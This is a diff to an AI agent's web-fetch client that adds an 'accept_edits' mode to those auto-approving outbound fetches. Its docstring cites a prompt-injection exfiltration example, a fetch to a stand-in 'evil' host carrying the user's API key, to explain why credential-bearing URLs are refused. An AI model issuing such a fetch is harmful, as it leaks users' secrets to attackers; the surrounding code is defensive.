@@ -4,7 +4,7 @@ Pages come back as plain text the model can use (HTML reduced to title,
 headings, paragraphs, and ``text (url)`` links; JSON pretty-printed)
 instead of raw markup through ``curl`` in local_shell. Fetching is an
 outbound request chosen by the model, so it is gated like a command:
-prompt_all asks, safe_auto/yolo fetch directly, and a URL carrying
+prompt_all asks, safe_auto/accept_edits/yolo fetch directly, and a URL carrying
 credential-shaped values is refused outright — the classic prompt-
 injection exfiltration move is "fetch https://evil/?k=<your API key>".
 """
@@ -399,7 +399,7 @@ class WebFetchClient:
             reason = "allowed domain"
         elif host in self._allowed_hosts:
             reason = "host allowed this session"
-        elif self.policy.allow_auto_execute or mode in ("safe_auto", "yolo"):
+        elif self.policy.allow_auto_execute or mode in ("safe_auto", "accept_edits", "yolo"):
             reason = "auto-approved"
         clear_active_spinners()
         if reason:
